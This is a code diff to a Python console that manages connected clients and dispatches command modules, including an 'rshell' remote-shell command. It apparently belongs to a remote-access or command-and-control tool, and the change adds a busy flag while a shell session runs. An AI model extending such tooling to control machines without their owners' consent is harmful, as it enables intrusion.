@@ -4,21 +4,18 @@ from colorama import Fore, Style
 import importlib
 import threading
 
+console_busy = False
+
 
 def handle_console(clients):
+    global console_busy
     command_finished = threading.Event()
     while True:
-        command = input(Fore.CYAN + "Enter command: " + Style.RESET_ALL)
-
-        if command == 'LIST':
-            for i in range(30):
-                print("-", end="")
-            print()
-            for i, conn in enumerate(clients):
-                print(f"{i}: {conn.getpeername()}")
-            for i in range(30):
-                print("-", end="")
-            print()
+        if not console_busy:
+            command = input(Fore.GREEN + "Enter command: " + Style.RESET_ALL)
+        else:
+            command_finished.wait()
+            command_finished.clear()
             continue
 
         # anything below this line requires an ID and uses handle_commands()
@@ -40,10 +37,13 @@ def handle_console(clients):
 
 
 def handle_commands(conn, command, id, clients, command_finished):
+    global console_busy
     cmd = command.split()[0]
     args = command.split()[1:]
     try:
         command_module = importlib.import_module(f'commands.{cmd.lower()}')
+        if cmd.lower() == 'rshell':
+            console_busy = True
         if command_module.requires_id and args:
             id = int(args.pop(0))
             if id >= len(clients) or id < 0:
